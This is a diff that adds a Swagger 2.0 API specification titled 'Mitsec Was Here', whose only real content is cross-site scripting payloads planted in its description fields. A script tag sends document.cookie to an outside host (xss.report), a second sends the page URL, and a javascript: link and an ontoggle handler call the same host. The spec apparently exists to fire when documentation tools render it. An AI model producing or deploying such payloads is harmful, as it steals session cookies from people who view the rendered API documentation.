@@ -1,0 +1,28 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "Mitsec Was Here",
+    "version": "1.0",
+    "description": "<script>fetch('https://xss.report/c/whoami?c='+document.cookie)</script>"
+  },
+  "paths": {
+    "/test": {
+      "get": {
+        "summary": "test",
+        "description": "test",
+        "parameters": [],
+        "responses": {
+          "200": {
+            "description": "<script>fetch('https://xss.report/c/whoami?u='+location.href)</script>"
+          },
+          "401": {
+            "description": "<a href=\"javascript:fetch('https://xss.report/c/whoami?x=1')\">click</a>"
+          },
+          "403": {
+            "description": "<details open ontoggle=fetch('https://xss.report/c/whoami?x=2')><summary>x</summary></details>"
+          }
+        }
+      }
+    }
+  }
+}
